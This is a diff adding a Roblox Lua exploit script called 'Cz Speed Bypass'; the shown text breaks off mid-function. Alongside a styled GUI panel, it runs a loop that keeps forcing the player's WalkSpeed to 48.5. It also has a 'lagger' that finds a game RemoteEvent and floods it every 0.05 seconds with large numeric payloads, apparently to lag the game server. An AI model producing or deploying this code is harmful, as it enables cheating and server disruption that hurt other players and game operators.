@@ -1,0 +1,1694 @@
+--==============================================================
+-- SERVICES
+--==============================================================
+local Players           = game:GetService("Players")
+local UserInputService  = game:GetService("UserInputService")
+local TweenService      = game:GetService("TweenService")
+local RunService        = game:GetService("RunService")
+local SoundService      = game:GetService("SoundService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService       = game:GetService("HttpService")
+local GuiService        = game:GetService("GuiService")
+
+local LP        = Players.LocalPlayer
+local PlayerGui = LP:WaitForChild("PlayerGui")
+
+local Xlu0AutoMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+
+--==============================================================
+-- CONFIG
+--==============================================================
+local CFG_FILE        = "CzSpeedBypass_Config.json"
+local LEGACY_CFG_FILE = "ArabPacketLagger_Config.json"
+
+local TITLE_TEXT     = "Cz Speed Bypass"
+local DEFAULT_BG     = "136102941611031"
+local BG_TRANSP      = 0.35
+local BG_DARKEN      = 0.75
+local PANEL_W        = 168
+local H_NORMAL       = 88
+local H_EXPANDED     = 154
+local R_PANEL        = 14
+local R_ITEM         = 7
+local GLOSS          = 0.94
+
+local MIN_POWER      = 15000
+local MAX_POWER      = 150000
+local DEFAULT_POWER  = 45000
+local POWER_STEP     = 5000
+local SHIFT_STEP_MUL = 4
+
+local FIRE_INTERVAL  = 0.05
+
+local NET_WAIT       = 6
+local AUTOSAVE       = 0.35
+local INTRO_HOLD     = 6
+
+local TARGET_WALKSPEED = 48.5
+local WALK_KEEP_ALIVE  = 0.10
+
+--==============================================================
+-- LAYOUT
+--==============================================================
+local PAD      = 8
+local INNER    = PANEL_W - PAD * 2
+local TOP_H    = 20
+local BOX_H    = 22
+local BTN_H    = 22
+local SLIDER_H = 8
+
+local Y_DIV      = TOP_H
+local Y_POWER    = 24
+local Y_SLIDER   = 50
+local Y_START    = 62
+
+local Y_BG_LABEL = 88
+local Y_BG_BOX   = 100
+local Y_BG_RESET = 126
+
+local TB_Y      = 3
+local TB_H      = 14
+local MIN_W     = 16
+local KEYBOX_W  = 44
+
+--==============================================================
+-- THEME
+--==============================================================
+_G.Xlu0ThemeColors = _G.Xlu0ThemeColors or {
+    PURPLE = Color3.fromRGB(207, 159, 255),
+    BLUE   = Color3.fromRGB(58, 128, 245),
+    RED    = Color3.fromRGB(232, 52, 68),
+    PINK   = Color3.fromRGB(255, 105, 180),
+    YELLOW = Color3.fromRGB(255, 214, 0),
+    GREY   = Color3.fromRGB(90, 90, 90),
+    WHITE  = Color3.fromRGB(255, 255, 255),
+    FOREST = Color3.fromRGB(46, 139, 87),
+}
+_G.Xlu0ThemeName = _G.Xlu0ThemeName or "WHITE"
+
+--==============================================================
+-- PALETTE
+--==============================================================
+local C = {
+    bg        = Color3.fromRGB(9, 9, 10),
+    field     = Color3.fromRGB(26, 26, 30),
+    fieldHov  = Color3.fromRGB(40, 40, 46),
+    fieldRun  = Color3.fromRGB(38, 38, 43),
+    white     = Color3.fromRGB(250, 250, 251),
+    soft      = Color3.fromRGB(200, 200, 208),
+    dim       = Color3.fromRGB(140, 140, 148),
+    line      = Color3.fromRGB(255, 255, 255),
+    black     = Color3.fromRGB(10, 10, 11),
+    purple    = Color3.fromRGB(207, 159, 255),
+    liveGreen = Color3.fromRGB(120, 255, 140),
+}
+
+--==============================================================
+-- HELPERS
+--==============================================================
+local function mk(className, props, parent)
+    local inst = Instance.new(className)
+    for k, v in pairs(props) do inst[k] = v end
+    if parent then inst.Parent = parent end
+    return inst
+end
+local function corner(obj, r) return mk("UICorner", { CornerRadius = UDim.new(0, r) }, obj) end
+local function stroke(obj, color, thickness, transparency, mode)
+    return mk("UIStroke", {
+        Color = color, Thickness = thickness,
+        Transparency = transparency or 0,
+        ApplyStrokeMode = mode or Enum.ApplyStrokeMode.Border,
+    }, obj)
+end
+local function textOutline(label, transparency)
+    return stroke(label, Color3.fromRGB(0, 0, 0), 1, transparency or 0.45, Enum.ApplyStrokeMode.Contextual)
+end
+local function nseq(a, b)
+    return NumberSequence.new({
+        NumberSequenceKeypoint.new(0, a),
+        NumberSequenceKeypoint.new(1, b),
+    })
+end
+local function gradient(obj, transparency, rotation)
+    local g = mk("UIGradient", {}, obj)
+    if transparency then g.Transparency = transparency end
+    if rotation then g.Rotation = rotation end
+    return g
+end
+local function tween(obj, props, time, style, dir)
+    TweenService:Create(
+        obj,
+        TweenInfo.new(time or 0.15, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out),
+        props
+    ):Play()
+end
+local function clamp(v, lo, hi)
+    if v < lo then return lo elseif v > hi then return hi end
+    return v
+end
+local function styleField(obj, radius)
+    obj.BorderSizePixel = 0
+    obj.BackgroundColor3 = C.field
+    corner(obj, radius)
+    return stroke(obj, C.line, 1, 0.80)
+end
+local function addPress(btn, scale)
+    scale = scale or 0.94
+    local sc = mk("UIScale", { Name = "PressScale", Scale = 1 }, btn)
+    btn.MouseButton1Down:Connect(function()
+        TweenService:Create(sc, TweenInfo.new(0.08), { Scale = scale }):Play()
+    end)
+    local function release()
+        TweenService:Create(sc, TweenInfo.new(0.14, Enum.EasingStyle.Back), { Scale = 1 }):Play()
+    end
+    btn.MouseButton1Up:Connect(release)
+    btn.MouseLeave:Connect(release)
+end
+
+--==============================================================
+-- POWER FORMAT
+--==============================================================
+local SUFFIX = { { "t", 1e12 }, { "b", 1e9 }, { "m", 1e6 }, { "k", 1e3 } }
+local MULT   = { k = 1e3, m = 1e6, b = 1e9, t = 1e12 }
+
+local function formatPower(value)
+    local n = math.floor(tonumber(value) or 0)
+    if n < 1000 then return tostring(n) end
+    for _, pair in ipairs(SUFFIX) do
+        local tag, size = pair[1], pair[2]
+        if n >= size then
+            local q = n / size
+            local text
+            if q >= 100 then text = string.format("%d", math.floor(q))
+            else
+                text = string.format("%.1f", math.floor(q * 10) / 10)
+                if string.find(text, "%.") then text = string.gsub(text, "%.?0+$", "") end
+            end
+            return text .. tag
+        end
+    end
+end
+
+local function parsePower(value)
+    if value == nil then return nil end
+    local s = string.lower(tostring(value))
+    s = string.gsub(s, "[%s_,]", "")
+    local number, tag = string.match(s, "^([%d%.]+)([kmbt]?)$")
+    if not number then return nil end
+    local n = tonumber(number)
+    if not n then return nil end
+    if tag ~= "" then n = n * MULT[tag] end
+    return math.floor(clamp(n, MIN_POWER, MAX_POWER))
+end
+
+local function emptyOnFocus(box, getPlaceholder)
+    box.Focused:Connect(function()
+        box.PlaceholderText = getPlaceholder()
+        box.Text = ""
+    end)
+end
+
+--==============================================================
+-- STATE
+--==============================================================
+local running       = false
+local power         = DEFAULT_POWER
+local expanded      = false
+local capturing     = false
+local dragging      = false
+local sliderDragging = false
+local net
+local runToken      = 0
+local introFinished = false
+
+local currentBg       = DEFAULT_BG
+local targetWalkSpeed = TARGET_WALKSPEED
+
+local bind = { kind = "key", code = "L", label = "L" }
+
+local saveConfig, loadConfig, queueSave
+local stopLagger, toggleLagger, revealPanel, refreshSlider
+
+--==============================================================
+-- CLEANUP
+--==============================================================
+for _, name in ipairs({
+    "CzSpeedBypass",
+    "ArabPacketLagger", "CrystalPacketLagger",
+    "HookPacketLagger", "Xlu0DuelsIntro",
+}) do
+    local old = PlayerGui:FindFirstChild(name)
+    if old then old:Destroy() end
+end
+
+--==============================================================
+-- WALKSPEED
+--==============================================================
+local function getHumanoid()
+    local char = LP.Character
+    if not char then return nil end
+    return char:FindFirstChildOfClass("Humanoid")
+end
+
+local function applyWalkSpeed()
+    local hum = getHumanoid()
+    if not hum or hum.Health <= 0 then return end
+    if math.abs(hum.WalkSpeed - targetWalkSpeed) > 0.05 then
+        pcall(function() hum.WalkSpeed = targetWalkSpeed end)
+    end
+end
+
+task.spawn(function()
+    while true do
+        applyWalkSpeed()
+        task.wait(WALK_KEEP_ALIVE)
+    end
+end)
+
+LP.CharacterAdded:Connect(function(char)
+    char:WaitForChild("Humanoid", 5)
+    task.wait(0.2)
+    applyWalkSpeed()
+end)
+task.defer(applyWalkSpeed)
+
+--==============================================================
+-- PANEL
+--==============================================================
+local screenGui = mk("ScreenGui", {
+    Name = "CzSpeedBypass",
+    ResetOnSpawn = false,
+    IgnoreGuiInset = true,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    DisplayOrder = 999,
+}, PlayerGui)
+
+local panel = mk("Frame", {
+    Name = "Panel",
+    Position = UDim2.fromOffset(0, 0),
+    Size = UDim2.fromOffset(PANEL_W, H_NORMAL),
+    BackgroundColor3 = C.bg,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    ZIndex = 2,
+    Visible = false,
+}, screenGui)
+corner(panel, R_PANEL)
+
+local bgImage = mk("ImageLabel", {
+    Name = "Background", Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://" .. DEFAULT_BG,
+    ImageTransparency = BG_TRANSP,
+    ScaleType = Enum.ScaleType.Crop,
+    ZIndex = 1,
+}, panel)
+corner(bgImage, R_PANEL)
+
+local scrim = mk("Frame", {
+    Name = "Scrim", Size = UDim2.fromScale(1, 1),
+    BackgroundColor3 = C.black, BackgroundTransparency = BG_DARKEN,
+    BorderSizePixel = 0, ZIndex = 2,
+}, panel)
+corner(scrim, R_PANEL)
+
+local vignette = mk("Frame", {
+    Name = "Vignette", Size = UDim2.fromScale(1, 1),
+    BackgroundColor3 = C.black, BackgroundTransparency = 0,
+    BorderSizePixel = 0, ZIndex = 2,
+}, panel)
+corner(vignette, R_PANEL)
+gradient(vignette, nseq(1, 0.55), 90)
+
+local gloss = mk("Frame", {
+    Name = "Gloss", Size = UDim2.fromScale(1, 1),
+    BackgroundColor3 = C.white, BackgroundTransparency = 0,
+    BorderSizePixel = 0, ZIndex = 3,
+}, panel)
+corner(gloss, R_PANEL)
+gradient(gloss, nseq(GLOSS, 1), 90)
+
+local panelStroke = stroke(panel, C.line, 1, 0.55)
+
+-- Top bar
+local dragBar = mk("Frame", {
+    Name = "DragBar",
+    Size = UDim2.new(1, 0, 0, TOP_H),
+    BackgroundTransparency = 1, Active = true, ZIndex = 6,
+}, panel)
+
+local liveDot = mk("Frame", {
+    Name = "LiveDot",
+    AnchorPoint = Vector2.new(0, 0.5),
+    Position = UDim2.new(0, 8, 0.5, 0),
+    Size = UDim2.fromOffset(4, 4),
+    BackgroundColor3 = C.dim,
+    BorderSizePixel = 0, ZIndex = 8,
+}, dragBar)
+corner(liveDot, 2)
+
+local title = mk("TextLabel", {
+    Name = "Title",
+    Position = UDim2.fromOffset(17, 0),
+    Size = UDim2.fromOffset(PANEL_W - 51, TOP_H),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold, Text = TITLE_TEXT,
+    TextColor3 = C.white, TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7,
+}, dragBar)
+textOutline(title, 0.35)
+
+local expandBtn = mk("TextButton", {
+    Name = "ExpandButton",
+    AnchorPoint = Vector2.new(1, 0),
+    Position = UDim2.new(1, -6, 0, TB_Y),
+    Size = UDim2.fromOffset(MIN_W, TB_H),
+    AutoButtonColor = false, Font = Enum.Font.GothamBold,
+    Text = "+", TextColor3 = C.white, TextSize = 12,
+    ZIndex = 8, Selectable = false,
+}, dragBar)
+styleField(expandBtn, 5)
+addPress(expandBtn, 0.90)
+
+mk("Frame", {
+    Name = "Divider",
+    Position = UDim2.new(0, 8, 0, Y_DIV),
+    Size = UDim2.new(1, -16, 0, 1),
+    BackgroundColor3 = C.line, BackgroundTransparency = 0.84,
+    BorderSizePixel = 0, ZIndex = 6,
+}, panel)
+
+-- Power row
+local minusBtn = mk("TextButton", {
+    Name = "MinusButton",
+    Position = UDim2.fromOffset(PAD, Y_POWER),
+    Size = UDim2.fromOffset(20, BOX_H),
+    AutoButtonColor = false, Font = Enum.Font.GothamBold,
+    Text = "\u{2212}", TextColor3 = C.white, TextSize = 14,
+    ZIndex = 6, Selectable = false,
+}, panel)
+styleField(minusBtn, R_ITEM)
+addPress(minusBtn, 0.90)
+
+local powerBox = mk("TextBox", {
+    Name = "PowerBox",
+    Position = UDim2.fromOffset(PAD + 24, Y_POWER),
+    Size = UDim2.fromOffset(INNER - 48, BOX_H),
+    ClearTextOnFocus = false, Font = Enum.Font.GothamBold,
+    Text = formatPower(power),
+    PlaceholderText = formatPower(DEFAULT_POWER),
+    PlaceholderColor3 = C.dim, TextColor3 = C.white,
+    TextSize = 13, TextXAlignment = Enum.TextXAlignment.Center,
+    ZIndex = 6, Selectable = true,
+}, panel)
+local powerStroke = styleField(powerBox, R_ITEM)
+
+local plusBtn = mk("TextButton", {
+    Name = "PlusButton",
+    AnchorPoint = Vector2.new(1, 0),
+    Position = UDim2.new(1, -PAD, 0, Y_POWER),
+    Size = UDim2.fromOffset(20, BOX_H),
+    AutoButtonColor = false, Font = Enum.Font.GothamBold,
+    Text = "+", TextColor3 = C.white, TextSize = 14,
+    ZIndex = 6, Selectable = false,
+}, panel)
+styleField(plusBtn, R_ITEM)
+addPress(plusBtn, 0.90)
+
+-- Slider
+local sliderTrack = mk("Frame", {
+    Name = "PowerSlider",
+    Position = UDim2.fromOffset(PAD, Y_SLIDER),
+    Size = UDim2.fromOffset(INNER, SLIDER_H),
+    BackgroundColor3 = C.field,
+    BorderSizePixel = 0,
+    ZIndex = 6,
+    Active = true,
+}, panel)
+corner(sliderTrack, SLIDER_H / 2)
+stroke(sliderTrack, C.line, 1, 0.85)
+
+local sliderFill = mk("Frame", {
+    Name = "Fill",
+    Size = UDim2.fromScale((power - MIN_POWER) / (MAX_POWER - MIN_POWER), 1),
+    BackgroundColor3 = C.purple,
+    BorderSizePixel = 0,
+    ZIndex = 7,
+}, sliderTrack)
+corner(sliderFill, SLIDER_H / 2)
+
+local sliderKnob = mk("Frame", {
+    Name = "Knob",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new((power - MIN_POWER) / (MAX_POWER - MIN_POWER), 0, 0.5, 0),
+    Size = UDim2.fromOffset(12, 12),
+    BackgroundColor3 = C.white,
+    BorderSizePixel = 0,
+    ZIndex = 8,
+}, sliderTrack)
+corner(sliderKnob, 6)
+stroke(sliderKnob, C.line, 1, 0.3)
+
+-- START / STOP
+local startBtn = mk("TextButton", {
+    Name = "StartButton",
+    Position = UDim2.fromOffset(PAD, Y_START),
+    Size = UDim2.fromOffset(INNER - KEYBOX_W - 4, BTN_H),
+    BackgroundColor3 = C.white, BorderSizePixel = 0,
+    ClipsDescendants = true, AutoButtonColor = false,
+    Font = Enum.Font.GothamBold, Text = "START",
+    TextColor3 = C.black, TextSize = 11,
+    ZIndex = 6, Selectable = true,
+}, panel)
+corner(startBtn, 11)
+addPress(startBtn, 0.94)
+
+local startGloss = mk("Frame", {
+    Name = "Gloss", Size = UDim2.new(1, 0, 0.5, 0),
+    BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 7,
+}, startBtn)
+gradient(startGloss, nseq(0.82, 1), 90)
+
+local startStroke = stroke(startBtn, C.line, 1, 0.55)
+
+-- Keybind
+local keyBox = mk("TextButton", {
+    Name = "KeybindBox",
+    AnchorPoint = Vector2.new(1, 0),
+    Position = UDim2.new(1, -PAD, 0, Y_START),
+    Size = UDim2.fromOffset(KEYBOX_W, BTN_H),
+    AutoButtonColor = false, Font = Enum.Font.GothamBold,
+    Text = bind.label, TextColor3 = C.white, TextSize = 10,
+    ZIndex = 6, Selectable = true,
+}, panel)
+styleField(keyBox, R_ITEM)
+addPress(keyBox, 0.94)
+
+-- BG Customizer
+local bgLabel = mk("TextLabel", {
+    Name = "BGLabel",
+    Position = UDim2.fromOffset(PAD, Y_BG_LABEL),
+    Size = UDim2.fromOffset(INNER, 10),
+    BackgroundTransparency = 1, Font = Enum.Font.GothamBold,
+    Text = "BG Image Customizer",
+    TextColor3 = C.soft, TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 6, Visible = false,
+}, panel)
+textOutline(bgLabel, 0.5)
+
+local bgBox = mk("TextBox", {
+    Name = "BGImageBox",
+    Position = UDim2.fromOffset(PAD, Y_BG_BOX),
+    Size = UDim2.fromOffset(INNER, BOX_H),
+    ClearTextOnFocus = false, Font = Enum.Font.GothamBold,
+    Text = currentBg, PlaceholderText = "Image ID",
+    PlaceholderColor3 = C.dim, TextColor3 = C.white,
+    TextSize = 11, TextXAlignment = Enum.TextXAlignment.Center,
+    ZIndex = 6, Visible = false, Selectable = true,
+}, panel)
+styleField(bgBox, R_ITEM)
+
+local bgReset = mk("TextButton", {
+    Name = "ResetButton",
+    Position = UDim2.fromOffset(PAD, Y_BG_RESET),
+    Size = UDim2.fromOffset(INNER, BOX_H),
+    AutoButtonColor = false, Font = Enum.Font.GothamBold,
+    Text = "RESET BG IMAGE", TextColor3 = C.white, TextSize = 11,
+    BackgroundColor3 = C.field, BorderSizePixel = 0,
+    ZIndex = 6, Visible = false, Selectable = false,
+}, panel)
+corner(bgReset, R_ITEM)
+stroke(bgReset, C.line, 1, 0.8)
+addPress(bgReset, 0.94)
+
+--==============================================================
+-- SLIDER SYNC
+--==============================================================
+refreshSlider = function()
+    local ratio = (power - MIN_POWER) / (MAX_POWER - MIN_POWER)
+    sliderFill.Size = UDim2.fromScale(ratio, 1)
+    sliderKnob.Position = UDim2.new(ratio, 0, 0.5, 0)
+end
+
+--==============================================================
+-- KEYBIND HELPERS
+--==============================================================
+local function friendlyKey(name)
+    local text = string.gsub(name, "^Button", "")
+    text = string.gsub(text, "^DPad", "D-")
+    text = string.gsub(text, "^Keypad", "NUM")
+    if text == "L1" then text = "LB" end
+    if text == "L2" then text = "LT" end
+    if text == "R1" then text = "RB" end
+    if text == "R2" then text = "RT" end
+    if text == "Select" then text = "VIEW" end
+    if text == "Start" then text = "MENU" end
+    if text == "" then return "?" end
+    if string.len(text) == 1 then return string.upper(text) end
+    return text
+end
+
+local function refreshKeyBox()
+    if capturing then
+        keyBox.Text = "..."
+        keyBox.TextColor3 = C.white
+        keyBox.BackgroundColor3 = C.fieldRun
+        return
+    end
+    keyBox.BackgroundColor3 = C.field
+    if bind.kind == "none" then
+        keyBox.Text = "--"
+        keyBox.TextColor3 = C.dim
+    else
+        keyBox.Text = bind.label
+        keyBox.TextColor3 = C.white
+    end
+end
+
+local function setBind(kind, code, label, save)
+    bind.kind = kind
+    bind.code = code
+    bind.label = label
+    refreshKeyBox()
+    if save ~= false and queueSave then queueSave() end
+end
+
+local function inputMatchesBind(input)
+    if bind.kind == "none" or capturing then return false end
+    if bind.kind == "mouse" then
+        local wanted = Enum.UserInputType[bind.code]
+        return wanted ~= nil and input.UserInputType == wanted
+    end
+    if input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name == bind.code then
+        return true
+    end
+    return false
+end
+
+refreshKeyBox()
+
+--==============================================================
+-- EXPAND / COLLAPSE
+--==============================================================
+local function setExpanded(state, instant)
+    expanded = state
+    bgLabel.Visible = state
+    bgBox.Visible = state
+    bgReset.Visible = state
+    expandBtn.Text = state and "\u{2212}" or "+"
+    local targetSize = UDim2.fromOffset(PANEL_W, state and H_EXPANDED or H_NORMAL)
+    if instant then panel.Size = targetSize
+    else tween(panel, { Size = targetSize }, 0.22) end
+    if queueSave then queueSave() end
+end
+
+expandBtn.Activated:Connect(function() setExpanded(not expanded) end)
+
+--==============================================================
+-- RUN VISUALS
+--==============================================================
+local function setRunningVisuals(state)
+    if state then
+        tween(startBtn, { BackgroundColor3 = C.fieldRun, TextColor3 = C.white }, 0.15)
+        tween(startStroke, { Transparency = 0.85 }, 0.15)
+        tween(panelStroke, { Color = C.purple, Transparency = 0.15 }, 0.25)
+        liveDot.BackgroundColor3 = C.liveGreen
+        startBtn.Text = "STOP"
+    else
+        tween(startBtn, { BackgroundColor3 = C.white, TextColor3 = C.black }, 0.15)
+        tween(startStroke, { Transparency = 0.55 }, 0.15)
+        tween(panelStroke, { Color = C.line, Transparency = 0.55 }, 0.25)
+        liveDot.BackgroundColor3 = C.dim
+        startBtn.Text = "START"
+    end
+end
+
+--==============================================================
+-- REMOTE RESOLUTION
+--==============================================================
+local function tryFindNet()
+    local ok, pkgs = pcall(function() return ReplicatedStorage:FindFirstChild("Packages") end)
+    if not ok or not pkgs then return nil end
+    local netObj = pkgs:FindFirstChild("Net")
+
+    if netObj then
+        local okA, candidate = pcall(function() return netObj:GetChildren()[230] end)
+        if okA and candidate and candidate:IsA("RemoteEvent") then return candidate end
+    end
+    if netObj then
+        for _, child in ipairs(netObj:GetChildren()) do
+            if child:IsA("RemoteEvent") then
+                local n = string.lower(child.Name)
+                if string.find(n, "net") or string.find(n, "packet") or string.find(n, "remote") then
+                    return child
+                end
+            end
+        end
+    end
+    for _, child in ipairs(pkgs:GetChildren()) do
+        if child:IsA("RemoteEvent") then return child end
+    end
+    for _, child in ipairs(ReplicatedStorage:GetChildren()) do
+        if child:IsA("RemoteEvent") then
+            local n = string.lower(child.Name)
+            if string.find(n, "net") or string.find(n, "packet") then return child end
+        end
+    end
+    return nil
+end
+
+task.spawn(function()
+    local waited = 0
+    while not net and waited < 15 do
+        net = tryFindNet()
+        if net then return end
+        task.wait(0.5)
+        waited = waited + 0.5
+    end
+    if not net then
+        warn("[CZ SPEED BYPASS] Could not resolve a remote. GUI will still work.")
+    end
+end)
+
+--==============================================================
+-- LAGGER  (payload = {power, power, power, power} · coroutine per shot)
+--==============================================================
+local function fireLoop(token)
+    while running and token == runToken do
+        local v = power
+        task.spawn(function()
+            if not running or token ~= runToken then return end
+            pcall(net.FireServer, net, {v, v, v, v})
+        end)
+        task.wait(FIRE_INTERVAL)
+    end
+end
+
+local function startLagger()
+    if running then return end
+
+    local parsed = parsePower(powerBox.Text)
+    if parsed then power = parsed end
+    powerBox.Text = formatPower(power)
+    refreshSlider()
+
+    running = true
+    runToken = runToken + 1
+    local token = runToken
+    setRunningVisuals(true)
+
+    task.spawn(function()
+        local waited = 0
+        while running and token == runToken and not net and waited < NET_WAIT do
+            task.wait(0.25)
+            waited = waited + 0.25
+        end
+        if not running or token ~= runToken then return end
+        if not net then
+            warn("[CZ SPEED BYPASS] Remote never became available — stopping.")
+            if stopLagger then stopLagger() end
+            return
+        end
+        fireLoop(token)
+    end)
+
+    if queueSave then queueSave() end
+end
+
+stopLagger = function()
+    if not running then return end
+    running = false
+    runToken = runToken + 1
+    setRunningVisuals(false)
+    if queueSave then queueSave() end
+end
+
+toggleLagger = function()
+    if running then stopLagger() else startLagger() end
+end
+
+startBtn.Activated:Connect(toggleLagger)
+
+--==============================================================
+-- BG IMAGE CHANGER
+--==============================================================
+local function updateBg()
+    local id = tostring(currentBg)
+    if string.find(id, "rbxassetid://") then
+        bgImage.Image = id
+    else
+        bgImage.Image = "rbxassetid://" .. id
+    end
+end
+
+bgBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local text = bgBox.Text
+    if text ~= "" then
+        currentBg = text
+        updateBg()
+        if queueSave then queueSave() end
+    end
+end)
+
+bgReset.Activated:Connect(function()
+    currentBg = DEFAULT_BG
+    bgBox.Text = DEFAULT_BG
+    updateBg()
+    if queueSave then queueSave() end
+end)
+
+--==============================================================
+-- POWER  APPLY
+--==============================================================
+local function applyPower(newVal, formatNow)
+    newVal = math.floor(clamp(newVal, MIN_POWER, MAX_POWER))
+    power = newVal
+    if formatNow then powerBox.Text = formatPower(power) end
+    refreshSlider()
+    if queueSave then queueSave() end
+end
+
+local function shiftHeld()
+    return UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)
+        or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)
+end
+
+local function adjustPower(delta)
+    local parsed = parsePower(powerBox.Text) or power
+    applyPower(parsed + delta, true)
+end
+
+minusBtn.Activated:Connect(function()
+    local step = shiftHeld() and POWER_STEP * SHIFT_STEP_MUL or POWER_STEP
+    adjustPower(-step)
+end)
+plusBtn.Activated:Connect(function()
+    local step = shiftHeld() and POWER_STEP * SHIFT_STEP_MUL or POWER_STEP
+    adjustPower(step)
+end)
+
+local function updateSliderFromX(x)
+    local trackAbs = sliderTrack.AbsolutePosition.X
+    local trackW   = sliderTrack.AbsoluteSize.X
+    if trackW <= 0 then return end
+    local ratio = clamp((x - trackAbs) / trackW, 0, 1)
+    local newPower = math.floor(MIN_POWER + ratio * (MAX_POWER - MIN_POWER) + 0.5)
+    applyPower(newPower, true)
+end
+
+sliderTrack.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        sliderDragging = true
+        updateSliderFromX(input.Position.X)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if sliderDragging then
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            updateSliderFromX(input.Position.X)
+        end
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if sliderDragging then
+        sliderDragging = false
+        if queueSave then queueSave() end
+    end
+end)
+
+local function hoverBind(btn, normalCol, hoverCol)
+    btn.MouseEnter:Connect(function()
+        if btn.BackgroundColor3 == normalCol then tween(btn, { BackgroundColor3 = hoverCol }, 0.10) end
+    end)
+    btn.MouseLeave:Connect(function()
+        if btn.BackgroundColor3 == hoverCol then tween(btn, { BackgroundColor3 = normalCol }, 0.10) end
+    end)
+end
+hoverBind(minusBtn, C.field, C.fieldHov)
+hoverBind(plusBtn, C.field, C.fieldHov)
+hoverBind(bgReset, C.field, C.fieldHov)
+
+powerBox:GetPropertyChangedSignal("Text"):Connect(function()
+    if queueSave then queueSave() end
+end)
+
+powerBox.Focused:Connect(function()
+    tween(powerStroke, { Thickness = 1.6 }, 0.12)
+end)
+emptyOnFocus(powerBox, function() return formatPower(power) end)
+powerBox.FocusLost:Connect(function()
+    tween(powerStroke, { Thickness = 1 }, 0.12)
+    local parsed = parsePower(powerBox.Text)
+    if parsed then power = parsed end
+    powerBox.Text = formatPower(power)
+    refreshSlider()
+    if saveConfig then saveConfig() end
+end)
+
+--==============================================================
+-- KEYBIND CAPTURE
+--==============================================================
+local function beginCapture()
+    if capturing then return end
+    capturing = true
+    refreshKeyBox()
+end
+
+local function endCapture()
+    capturing = false
+    refreshKeyBox()
+end
+
+local function overKeyBox(position)
+    local a = keyBox.AbsolutePosition
+    local s = keyBox.AbsoluteSize
+    return position.X >= a.X and position.X <= a.X + s.X
+        and position.Y >= a.Y and position.Y <= a.Y + s.Y
+end
+
+local function handleCapture(input)
+    local kind = input.UserInputType
+    if kind == Enum.UserInputType.MouseButton1 or kind == Enum.UserInputType.Touch then
+        if not overKeyBox(input.Position) then endCapture() end
+        return
+    end
+    if kind == Enum.UserInputType.Keyboard or string.find(kind.Name, "Gamepad") then
+        local key = input.KeyCode
+        if key == Enum.KeyCode.Unknown then return end
+        if key == Enum.KeyCode.Escape or key == Enum.KeyCode.ButtonB then
+            endCapture(); return
+        end
+        setBind("key", key.Name, friendlyKey(key.Name))
+        endCapture()
+        return
+    end
+    if kind == Enum.UserInputType.MouseButton2 then
+        setBind("mouse", "MouseButton2", "RMB"); endCapture()
+    elseif kind == Enum.UserInputType.MouseButton3 then
+        setBind("mouse", "MouseButton3", "MMB"); endCapture()
+    end
+end
+
+keyBox.Activated:Connect(function()
+    if capturing then endCapture() else beginCapture() end
+end)
+
+--==============================================================
+-- INPUT
+--==============================================================
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not introFinished then return end
+    if capturing then handleCapture(input); return end
+    if UserInputService:GetFocusedTextBox() then return end
+    if inputMatchesBind(input) then
+        local isGamepad = string.find(input.UserInputType.Name, "Gamepad") ~= nil
+        if gameProcessed and isGamepad then return end
+        toggleLagger()
+    end
+end)
+
+--==============================================================
+-- GAMEPAD UI NAV
+--==============================================================
+GuiService.AutoSelectGuiEnabled = true
+UserInputService.LastInputTypeChanged:Connect(function(inputType)
+    if not introFinished then return end
+    if string.find(tostring(inputType), "Gamepad") and GuiService.SelectedObject == nil then
+        GuiService.SelectedObject = startBtn
+    end
+end)
+
+--==============================================================
+-- DRAGGING
+--==============================================================
+local panelPos
+local dragStart
+
+local function overTopButton(pos)
+    local a = expandBtn.AbsolutePosition
+    local s = expandBtn.AbsoluteSize
+    return pos.X >= a.X and pos.X <= a.X + s.X and pos.Y >= a.Y and pos.Y <= a.Y + s.Y
+end
+
+local function clampToScreen(posX, posY)
+    local cam = workspace.CurrentCamera
+    local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
+    local h = expanded and H_EXPANDED or H_NORMAL
+    return UDim2.fromOffset(
+        math.floor(clamp(posX, -PANEL_W + 60, vp.X - 60)),
+        math.floor(clamp(posY, -TOP_H + 10, vp.Y - h - 4))
+    )
+end
+
+dragBar.InputBegan:Connect(function(input)
+    if not introFinished then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        if overTopButton(input.Position) then return end
+        dragging = true
+        dragStart = input.Position
+        panelPos = panel.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                if queueSave then queueSave() end
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not dragging then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        panel.Position = clampToScreen(
+            panelPos.X.Offset + delta.X,
+            panelPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+local lastTitleClick = 0
+dragBar.InputBegan:Connect(function(input)
+    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
+    if overTopButton(input.Position) then return end
+    local now = os.clock()
+    if now - lastTitleClick < 0.35 then
+        local cam = workspace.CurrentCamera
+        local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
